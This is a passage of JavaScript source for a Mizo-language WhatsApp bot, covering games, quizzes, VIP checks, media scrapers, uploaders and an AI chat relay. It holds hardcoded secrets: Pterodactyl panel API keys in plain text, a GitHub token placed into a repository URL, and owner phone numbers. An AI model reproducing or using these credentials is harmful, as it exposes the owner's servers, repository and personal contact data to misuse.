	    0: 'Position a dik lo',
	    }[ok])
	    return !0
	    }
	    if (m.sender === room13.game.winner) isWin = true
	    else if (room13.game.board === 511) isTie = true
	    let arr = room13.game.render().map(v => {
	    return {
	    X: '❌',
	    O: '⭕',
	    1: '1️⃣',
	    2: '2️⃣',
	    3: '3️⃣',
	    4: '4️⃣',
	    5: '5️⃣',
	    6: '6️⃣',
	    7: '7️⃣',
	    8: '8️⃣',
	    9: '9️⃣',
	    }[v]
	    })
	    if (isSurrender) {
	    room13.game._currentTurn = m.sender === room13.game.playerX
	    isWin = true
	    }
	    let winner = isSurrender ? room13.game.currentTurn : room13.game.winner
	    let str = `Room ID: ${room13.id}
A hnuia number hi i duh ber thlang rawh,

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} A chak zawk!` : isTie ? `In in hnehtawk chiah` : `Hi ${['❌', '⭕'][1 * room13.game._currentTurn]} (@${room13.game.currentTurn.split('@')[0]}) I thlan hun\n`}
❌: @${room13.game.playerX.split('@')[0]}
⭕: @${room13.game.playerO.split('@')[0]}
͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏
He game hi i khel peih loh chuan surrender tih type mai tur ani`
	    if ((room13.game._currentTurn ^ isSurrender ? room13.x : room13.o) !== m.chat)
	    room13[room13.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
	    if (room13.x !== room13.o) await HBWABotMz.sendText(room13.x, str, m, { mentions: parseMention(str) } )
	    await HBWABotMz.sendText(room13.o, str, m, { mentions: parseMention(str) } )
	    if (isTie || isWin) {
	    delete this.game[room13.id]
	    }
	    }
 //end
async function loading () {
var HBLoading = [
"《▒▒▒▒▒▒▒▒▒▒▒▒》0%",
"《█▒▒▒▒▒▒▒▒▒▒▒》10%",
"《█▒▒▒▒▒▒▒▒▒▒▒》10%",
"《████▒▒▒▒▒▒▒▒》30%",
"《████▒▒▒▒▒▒▒▒》30%",
"《███████▒▒▒▒▒》50%",
"《███████▒▒▒▒▒》50%",
"《██████████▒▒》80%",
"《██████████▒▒》80%",
"《████████████》100%",
"♻️ Reilo te min lo nghak rawh..."
]
let { key } = await HBWABotMz.sendMessage(from, {text: '《▒▒▒▒▒▒▒▒▒▒▒▒》0%\n♻️ _Nghak lawk rawh.._'},{quoted:m})

for (let i = 0; i < HBLoading.length; i++) {
 await HBWABotMz.sendMessage(from, {text: HBLoading[i], edit: key },{quoted:m})}
}
      
        
async function GetBuffer(url) {
return new Promise(async (resolve, reject) => {
let buffer;
await jimp
.read(url)
.then((image) => {
image.getBuffer(image._originalMime, function (err, res) {
buffer = res;
})
})
.catch(reject)
if (!Buffer.isBuffer(buffer)) reject(false)
resolve(buffer)
})
}
function GetType(Data) {
return new Promise((resolve, reject) => {
let Result, Status;
if (Buffer.isBuffer(Data)) {
Result = new Buffer.from(Data).toString("base64")
Status = 0;
} else {
Status = 1;
}
resolve({
status: Status,
result: Result,
})
})
}

const { checkVipUser } = require('./lib/vipem');
const gtoken = wcvip2 // Keep this secret
const gowner = "HBMods-OFC";
const grepo = "Database";
const ftcvip = await fetch("https://raw.githubusercontent.com/HBMods-OFC/Vawk/master/VIP/vip-pro.json");
const vipmem = await ftcvip.json();
const vipmem2 = [];  // Initialize as an array to store user data
// Define time zone
const vipahmantur = moment.tz('Asia/Kolkata');
// Check if the user is a VIP and if their VIP status is expired
const isVip = checkVipUser(m.sender, vipmem);
const isVip2 = checkVipUser(m.sender, vipmem2);
// Function to check expiration status for a VIP user
const isExp = vipmem.some((member) => {
    if (member.id === m.sender && member.expired !== "lifetime") {
        const expirationDate = moment(member.expired, 'YYYY-MM-DD')
        if (vipahmantur.isAfter(expirationDate)) {
            return true;
        }
    }
    return false;
})
// Function to check expiration status for a VIP user in vipmem2
const prem = require('./lib/premium');
const premium = JSON.parse(fs.readFileSync('./asset/database/premium.json'));
const isPrem = prem.checkPremiumUser(m.sender, premium) || false
const isPremExp = premium.some((member) => {
    if (member.id === m.sender && member.expired !== "lifetime") {
        const expirationDate = moment(member.expired, 'YYYY-MM-DD')
        if (vipahmantur.isAfter(expirationDate)) {
            return true;
        }
    }
    return false;
})

const replyvipexp = () => {
 dodoi(`⌛I vip hun chhung a tawp tawh!! renew na plan i en duh chuan  *buyvip* tih type rawh`)
 }

const hmangsuh = await fetch("https://raw.githubusercontent.com/HBMods-OFC/Vawk/master/blacklist.json");
const block1 = await hmangsuh.json();
const phallo = block1.includes(m.sender)
const aActiveEm = (isVip) ? '🟢 Active' : '🔴 Not Active';
const DuhSak = await fetch("https://raw.githubusercontent.com/HBMods-OFC/Vawk/master/admin.json");
const duhsak1 = await DuhSak.json();
const HerbertTheCreator1 = duhsak1.includes(m.sender)
const Dmdftc = ('https://raw.githubusercontent.com/HBMods-OFC/Vawk/master/Coin&Limit/limit&coin.json')

//================== 
const adminpn = ["919863840872@s.whatsapp.net","918416093656@s.whatsapp.net"]
const PanelSF = adminpn.includes(m.sender)
const PanelApi = "ptla_tdowwLHsu3eOOKTmNHrsiDZeMi3hwVroCCRBIfKa13P"
const CPanelApi = "ptlc_B8fZprcbxtmwllfn6ZR1LScjMKbAvJMiFckOpiyZ5Hi"
const domain = "https://pterodactyl.hbwabot-panel.site"
const eggsnb = "16"
const locationsrv = "1"

//===========
let Dmdftc2 = await fetch(Dmdftc)
let Dmdresult = await Dmdftc2.json()
const hmanzat = Dmdresult.hmanzat
const dawnzat = Dmdresult.dawnzat
const dawnzat2 = Dmdresult.dawnzat2
const dawnzat3 = Dmdresult.lulian
const limitneihtu = m.sender
const kantitle = "title";
const kancoins = "cara";
const hmanzat2 = "50";
if (isZawhna && (block1.includes(m.sender) || block1.includes(m.from))) {
    return 
}

if (m.isGroup) {
 const isCmd21 = body?.startsWith("/") || false;
  if (!isCmd21 && !isBotAdmins && !group_bot) {
    const textLower = m.text.toLowerCase();
     if (textLower === 'p' || textLower === 'allmenu' || textLower === 'menu' || textLower === 'runtime') { 
     dodoi("He groupah hian admin ka nih loh avangin prefix(/) nen loh chuan hman theih ka ni lovang");
     return
     }
      return;
    }
  }

const dailylimit = async () => {
if (isBusiness) {
dodoi2(`${mtl2.climit}`)
return
}
    let messageContent = {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: ``
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: `${mtl2.climit}`
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        hasMediaAttachment: false
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                name: "quick_reply",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "CLAIM",
                                    id: `${prefix}`+`claim`
                                })
                            }
                        ]
                    })
                })
            }
        }
    };

    let msgs = generateWAMessageFromContent(m.chat, messageContent, { quoted: m });
    HBWABotMz.relayMessage(m.chat, msgs.message, {});
    return;
};


const replyvip = () => {
if (isBusiness) {
dodoi2(`${mtl2.cvip}`)
return
}
 let messageContent = {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: ``
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: `${mtl2.cvip}`
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        hasMediaAttachment: false
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                name: "quick_reply",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "Buy Vip",
                                    id: `${prefix}`+`buyvip`
                                })
                            }
                        ]
                    })
                })
            }
        }
    };

    let msgs = generateWAMessageFromContent(m.chat, messageContent, { quoted: m });
   HBWABotMz.relayMessage(m.chat, msgs.message, {});
    return;
 }
 async function savePin(url) {
	try {
		const response = await axios.get(`https://www.savepin.app/download.php?url=${encodeURIComponent(url)}&lang=en&type=redirect`);
		const html = response.data;
		const $ = cheerio.load(html);

		let results = [];
		$('td.video-quality').each((index, element) => {
			const type = $(element).text().trim();
			const format = $(element).next().text().trim();
			const downloadLinkElement = $(element).nextAll().find('#submiturl').attr('href');
			if (downloadLinkElement) {
				let downloadLink = downloadLinkElement;
				if (downloadLink.startsWith('force-save.php?url=')) {
					downloadLink = decodeURIComponent(downloadLink.replace('force-save.php?url=', ''));
				}
				results.push({ type, format, downloadLink });
			}
		});
		const title = $('h1').text().trim();

		return {
			title,
			results
		};
	} catch (error) {
		console.error("Error:", error.response ? error.response.data : error.message);
		return { success: false, message: error.message };
	}
};
async function alightScrape(url) {
	try {
		const response = await axios.get(url, {
			headers: {
				'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
				'Referer': 'https://alight.link',
			},
		});
		const $ = cheerio.load(response.data);
		const title = $('meta[property="og:title"]').attr('content');
		const description = $('meta[property="og:description"]').attr('content');
		return {
			title,
			description
		};
	} catch (error) {
		return { error: 'The end of data collection from the Alight Motion URL' };
	}
};
/*
 const dailylimit = () => {
 dodoi2(`${mtl2.climit}`)
 }
 const replyvip = () => {
 dodoi2(`${mtl2.cvip}`)
 }
*/ 
const loadingimg = ('https://raw.githubusercontent.com/HBMods-OFC/Vawk/master/HBWABot-Mz/LoadingImg.json')
const approthumb = "https://raw.githubusercontent.com/HBMods-OFC/Vawk/master/Media/verification.png"
const buyvipthumb = "https://raw.githubusercontent.com/HBMods-OFC/Vawk/master/Media/buyvipthumb.png"
const loadingimg1 = await fetch(loadingimg)
const loadingimg2 = await loadingimg1.json()
const loadingimg3 = loadingimg2.url;
const howtobebot4 = loadingimg2.vid
const timestamp = speed()
const latensi = speed() - timestamp
const mark = "0@s.whatsapp.net"
let isQuestionActive = false
let currentQuestion;
let isQuizActive = false;
const aipr = await fetch('https://raw.githubusercontent.com/HBMods-OFC/Vawk/master/HBWABot-Mz/aiprompt.json')
const aipr2 = await aipr.json()
const aipr3 = aipr2.prompt;
if (_mizoquiz.hasOwnProperty(m.sender.split('@')[0]) && isZawhna) {
    kuis = true;
    let room = _mizoquiz[m.sender.split('@')[0]];
    let teks = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
    let isSurender = /^((me)?give up|surr?ender)$/i.test(m.text)
    if (!isSurender) {
        let index = room.chhanna.findIndex(v => v.toLowerCase().replace(/[^\w\s\-]+/, '') === teks)
        if (room.bodaih[index]) return !0;
        room.bodaih[index] = m.sender;
    }
    let isWin = room.bodaih.length === room.bodaih.filter(v => v).length;
    let caption = `*Q.* ${room.zawhna}\n\nCHHAN TUR AWM ZAT [ *${room.chhanna.length}* ]
*Ans:*\n${Array.from(room.chhanna, (chhanna, index) => {
return isSurender || room.bodaih[index] ? `(${index + 1}) ${chhanna} ${room.bodaih[index] ? '✓' : ''}`.trim() : false;
    }).filter(v => v).join('\n')}
    ${isSurender ? '' : ``}`.trim()

    if (isWin) {
        const give = await eco.give(limitneihtu, kancoins, `${room.chhanna.length}0`)
    }

    const mes = await HBWABotMz.sendText(m.chat, caption, m, { contextInfo: { mentionedJid: parseMention(caption) }})

    if (isWin) {
        dodoi(`🤩Zawhna i chhan thei vek a vangin coins ${room.chhanna.length}0 🪙 i dawng e🪙🥳`)
    } else if (isSurender) {
        dodoi('I in surrender avangin 🪙50 cut a ni, tinge le aw ka ti🤔 tiang mai mai han hriat loh')
        await eco.deduct(limitneihtu, kancoins, 50)
    }
    if (isWin || isSurender) {
        delete _mizoquiz[m.sender.split('@')[0]];
    }
}

if (thlalakquiz.hasOwnProperty(m.sender.split('@')[0]) && isZawhna) {
    kuis = true;
    achhanna = thlalakquiz[m.sender.split('@')[0]];
    if (budy.toLowerCase() == achhanna) {
        await HBWABotMz.sendMessage(m.chat, { text: `I chhang dik a ni!!👏🥳` }, { quoted: m })
        delete thlalakquiz[m.sender.split('@')[0]];
    } else {
        dodoi('*A dik lo🧐!*')
    }
}
if (_biblequiz.hasOwnProperty(m.sender.split('@')[0]) && isZawhna) {
    kuis = true;
    achhanna = _biblequiz[m.sender.split('@')[0]];
    if (budy.toLowerCase() == achhanna) {
        await HBWABotMz.sendMessage(m.chat, { text: `*I chhan dik avangin coins 20🪙 i dawng a ni!*🥳` }, { quoted: m });
        await eco.give(limitneihtu, kancoins, 20);
        delete _biblequiz[m.sender.split('@')[0]];
    } else {
        await dodoi('*I chhan dik loh avangin i coins 50🪙 cut a ni*\nBible Chhiar tam rawh🫠');
        await eco.deduct(limitneihtu, kancoins, 50);
        delete _biblequiz[m.sender.split('@')[0]];
    }
}

const magicpath = './asset/database/magicpick.json';
let magicdb = { active: {}, backup: {} };
if (fs.existsSync(magicpath)) {
  magicdb = JSON.parse(fs.readFileSync(magicpath));
}
function saveDb() {
  fs.writeFileSync(magicpath, JSON.stringify(magicdb, null, 2));
}
const budyTrimmed = budy.trim();
if (magicdb.active[m.sender.split('@')[0]]?.step === 'box' && /^[1-3]$/.test(budyTrimmed)) {
  const userId = m.sender.split('@')[0];
  const selected = parseInt(budyTrimmed);
  const correct = magicdb.active[userId].box;
  if (selected !== correct) {
    await eco.deduct(m.sender, 'cara', 20);
    delete magicdb.active[userId];
    saveDb();
    return dodoi(`I Box select (📦 ${selected}) hian quiz card a nei lo 😔\n*🪙 20 i chan*`);
  }
  const quizList = await fetchJson('https://raw.githubusercontent.com/HBMods-OFC/Vawk/refs/heads/master/HBWABot-Mz/biblequiz.json');
  const result = quizList[Math.floor(Math.random() * quizList.length)];
  magicdb.active[userId] = {
    answer: result.achhanna,
    question: result.zawhna,
    step: 'quiz'
  };
  magicdb.backup[userId] = {
    answer: result.achhanna,
    question: result.zawhna
  };
  saveDb();
  return HBWABotMz.sendMessage(m.chat, {
    text: `> *Multiple Choice Question*\n${result.zawhna}\n\nAns: ___________`,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true,
        containsAutoReply: true,
        title: `MagicPick Quiz`,
        body: `Answer correctly to win 🪙 20!`,
        previewType: "PHOTO",
        thumbnail: fs.readFileSync(`./asset/image/HBWABot.png`)
      }
    }
  }, { quoted: m });
}
if (magicdb.active[m.sender.split('@')[0]]?.step === 'quiz' && isZawhna && budyTrimmed.length > 1) {
  const userId = m.sender.split('@')[0];
  const correctAns = magicdb.active[userId].answer;
  if (budyTrimmed.toLowerCase() === correctAns.toLowerCase()) {
    await eco.give(m.sender, 'cara', 20);
    await HBWABotMz.sendMessage(m.chat, {
      text: `*✅ I chhan dik avangin coins 20🪙 i dawng a ni!* 🥳`
    }, { quoted: m });
  } else {
    await eco.deduct(m.sender, 'cara', 50);
    await dodoi(`❌ *I chhan dik loh avangin i coins 50🪙 cut a ni*`);
  }
  delete magicdb.active[userId];
  saveDb();
}

const accpetts = () => {
    let msg = generateWAMessageFromContent(from, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2,
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: '',
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: 'HBWABot Mizo',
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        title: `${mtl2.tos}`,
                        subtitle: '',
                        hasMediaAttachment: false,
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                name: "single_select",
                                buttonParamsJson: JSON.stringify({
                                    title: `${mtl2.tosq}`,
                                    sections: [
                                        {
                                            title: `${mtl2.tosq}`,
                                            rows: [
                                                {
                                                    title: "In terms of service hi",
                                                    description: `Agree`,
                                                    id: `${prefix}` + `pawme/`
                                                },
                                                {
                                                    title: "In terms of service hi",
                                                    description: `Skip`,
                                                    id: `pawmlo/`
                                                }
                                            ]
                                        }
                                    ]
                                })
                            }
                        ]
                    }),
                    contextInfo: {
                        mentionedJid: [m.sender],
                        forwardingScore: 1,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: '120363191549232941@newsletter',
                            newsletterName: "Terms of Service",
                            serverMessageId: 145,
                        }
                    }
                })
            }
        }
    }, { quoted: m });

    // Relay the message using HBWABotMz
    HBWABotMz.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id,
    });

    return;
};
function formatResponse(response) {
    return response
        .replace(/ka siamtu|ka neitu/g, 'min siamtu')
        .replace(/Ka neitu|Ka siamtu/g, 'Min siamtu')
        .replace(/I tanpui turin ka|tanpui turin ka/g, 'tanpui tur chein ka')
        .replace(/Ka tanpui turin ka|ka tanpui turin ka/g, 'Nang tanpui tur che a siam ka ni')
        .replace(/ka rawn kal a ni/g, 'ka awm e')
        .replace(/•English•/g, `•${bot_language}•`)
        .replace(/•lus•/g, `Mizo`)
        .replace(/•de•/g, `German`)
        .replace(/•hi•/g, `Hindi`)
        .replace(/•pt-BR•/g, `Brazil`)
        .replace(/•id•/g, `Indonesian`)
        .replace(/•ru•/g, `Russian`)
        .replace(/•en•/g, `English`)
        .replace(/ka chhuah ang che/g, 'chhuahin ka pui ang che')
        .replace(/ka puih theih che a awm em/g, `puih theihna che ka la nei em`)
        .replace(/Ka ngaidam che u|Ka ngaidam che|Ngaidam rawh|Ngaidam rawh u/g, 'Ka tihpalh');
}
async function deleteFilesExcept(folderPath, exceptionFile) {
    if (fs.existsSync(folderPath)) {
        const files = fs.readdirSync(folderPath);
        files.forEach(file => {
            if (!exceptionFile || file !== exceptionFile) {
                const filePath = path.join(folderPath, file);
                if (fs.lstatSync(filePath).isFile()) {
                    fs.unlinkSync(filePath);
                } else {
                    fs.rmSync(filePath, { recursive: true, force: true });
                }
            }
        });
    }
}

async function HBWA_Ai(content) {
            try {
                const response = await axios.post('https://luminai.my.id/', {
                    content,
                    cName: "S-AI",
                    cID: "S-AIbAQ0HcC"
                });
                return response.data;
            } catch (error) {
                console.error(error);
                throw error;
            }
        }

const privacy11 = "privacy";
let bibleUsageCount = 0;

db.users.autoai_op = db.users.autoai_op || {};
let autoai_op = db.users.autoai_op;

const BossHerbert = (m.sender === "918416093656@s.whatsapp.net")
  ? `I respect you boss Herbert, you created me. I'm your ${global.botname}. Your name is Herbert Suantak. ${aipr3}`
  : `I'm ${global.botname}, created to assist humans like you. I was created by Herbert Suantak. ${aipr3}`;

if (autoai_op[m.sender] && isZawhna && m.text) {
    const commandPattern = new RegExp(`^${prefix}(autoai off|Autoai off|AutoAi OFF|autoai disable|Autoai disable)`, 'i');
    if (commandPattern.test(m.text)) {
        const userId = m.sender;
        if (autoai_op[userId]) {
            delete autoai_op[userId];
            db.users.autoai_op = autoai_op;
            return dodoi(`• Auto Ai chu disabled a nih tawh avangin i on leh hma chuan hman chhunzawm theih a ni rih lo ang`);
        } else {
            return dodoi(`• Auto AI hi i off sa a nih avangin off double theih a ni lo`);
        }
    }
    const imageKeywords = ["make an image", "make a picture", "thlalak siam", "generate an image", "create a picture"];
    const siamthathmasak = m.text
        .replace(/Zawhte|zawhte|zohte/g, 'cat')
        .replace(/Vawk|vawk/g, 'pig');
    const translatedText = await mizo_tawnga_translate_na.translate(`lus`, `en`, siamthathmasak);
    const previousMessages = autoai_op[m.sender]?.sessionChat || [];
    const messages = [
        { role: "assistant", content: BossHerbert },
        ...previousMessages.map((msg, i) => ({ role: i % 2 === 0 ? 'user' : 'assistant', content: msg })),
        { role: "user", content: translatedText }
    ];
    const isImageRequest = imageKeywords.some(keyword => translatedText.toLowerCase().includes(keyword));
    if (isImageRequest) {
        try {
            HBWABotMz.sendPresenceUpdate('composing', m.chat);
            const params = { prompt: translatedText }; 
            const imageBuffer = await cfAI.ask({ modelId: 5, params });
            return HBWABotMz.sendMessage(m.chat, { image: Buffer.from(imageBuffer), caption: text});
        } catch (error) {
            console.error("Error in image generation:", error);
            return dodoi(`_❌ Image generation failed: ${error.message}_`);
        }
    }  
    try {
        HBWABotMz.sendPresenceUpdate('composing', m.chat);
        const response = await cfAI.ask({ modelId: 1, messages });
        if (response.result?.response) {
            let chutin = response.result.response;
            const targetLang = chutin.includes('```') ? 'en' : `${bot_language}`;
            const finalResponse = await mizo_tawnga_translate_na.translate(`auto`, targetLang, chutin);
            const formattedResponse = formatResponse(finalResponse);
            autoai_op[m.sender] = { sessionChat: [...previousMessages, translatedText, chutin] };
            db.users.autoai_op = autoai_op; 
            return dodoi2(`${formattedResponse}`);
        }
    } catch (error) {
        console.error("Error in chat processing:", error);
        return dodoi(`_❌ AI fetch error: ${error.message}_`);
    }
}

const Schema = mongoose.Schema;
    const economySchema = new Schema({
        guildID: String,
        userID: String,
        wallet: { type: Number, default: 0 },
        bank: { type: Number, default: 0 },
        bankCapacity: { type: Number, default: 2500 },
        daily: { type: String, default: "0" }
    });
    const Economy = mongoose.models.Economy || mongoose.model('Economy', economySchema);
    async function lb(guildID, count) {
        if (!guildID) throw new TypeError("Please Provide a Guild ID");
        if (!count) throw new TypeError("You didn't Provide the amount of users");
        if (isNaN(count)) throw new TypeError("The Amount of Users must be a number");
        const users = await Economy.find({ guildID }).sort([['wallet', 'descending']]).exec();
        return users.slice(0, count);
    }
async function igdl2(url) {
      let res = await axios("https://indown.io/");
      let _$ = cheerio.load(res.data);
      let referer = _$("input[name=referer]").val();
      let locale = _$("input[name=locale]").val();
      let _token = _$("input[name=_token]").val();
      let { data } = await axios.post(
        "https://indown.io/download",
        new URLSearchParams({
          link: url,
          referer,
          locale,
          _token,
        }),
        {
          headers: {
            cookie: res.headers["set-cookie"].join("; "),
          },
        }
      );
      let $ = cheerio.load(data);
      let result = [];
      let __$ = cheerio.load($("#result").html());
      __$("video").each(function () {
        let $$ = $(this);
        result.push({
          type: "video",
          thumbnail: $$.attr("poster"),
          url: $$.find("source").attr("src"),
        });
      });
      __$("img").each(function () {
        let $$ = $(this);
        result.push({
          type: "image",
          url: $$.attr("src"),
        });
      });

      return result;
    }
async function uploadToAPI(url, buffer, ext, fieldName = "file") {
    try {
        let formData = new FormData();
        formData.append(fieldName, buffer, `file.${ext}`);
        let response = await fetch(url, {
            method: "POST",
            body: formData,
        });
        let data = await response.json();
        return data.result?.url || data.link || data.files?.[0]?.url || null;
    } catch (error) {
        console.error(`Error uploading to ${url}:`, error.message);
        return null;
    }
}

// Upload file to Catbox
async function uploadToCatbox(buffer, ext) {
    try {
        let formData = new FormData();
        formData.append("fileToUpload", buffer, `file.${ext}`);
        formData.append("reqtype", "fileupload");

        let response = await fetch("https://catbox.moe/user/api.php", {
            method: "POST",
            body: formData,
        });

        return await response.text();
    } catch (error) {
        console.error("Error uploading to Catbox:", error.message);
        return null;
    }
}

async function tourlup(filePath) {
    try {
        const buffer = fs.readFileSync(filePath);
        const { ext } = await fromBuffer(buffer);
        const apis = [
            { url: "https://8030.us.kg/api/upload.php", field: "file" },
            { url: "https://file.btch.rf.gd/api/upload.php", field: "file" },
            { url: "https://i.supa.codes/api/upload", field: "file" },
            { url: "https://file.io/?expires=1d", field: "file" },
        ];
        for (const api of apis) {
            let uploadedUrl = await uploadToAPI(api.url, buffer, ext, api.field);
            if (uploadedUrl) return uploadedUrl;
        }
        let catboxUrl = await uploadToCatbox(buffer, ext);
        if (catboxUrl) return catboxUrl;
        console.error("All upload attempts failed.");
        return null;
    } catch (error) {
        console.error("Error:", error.message);
        return null;
    }
}
    

let vip = [];
async function pushToGitHub(content) {
    const REPO_URL = `https://${wcvip}@github.com/HBMods-OFC/Vawk.git`;
    const TEMP_DIR = path.join(__dirname, 'temp_repo');
    const FILE_NAME = 'VIP/vip-pro.json';
    const filePath = path.join(TEMP_DIR, FILE_NAME);
    try {
        if (!fs.existsSync(TEMP_DIR)) {
            fs.mkdirSync(TEMP_DIR, { recursive: true });
        }
        const git = simpleGit(TEMP_DIR);
        await git.init();
        await git.addRemote('origin', REPO_URL);
        await git.fetch('origin', 'master');
        await git.pull('origin', 'master');
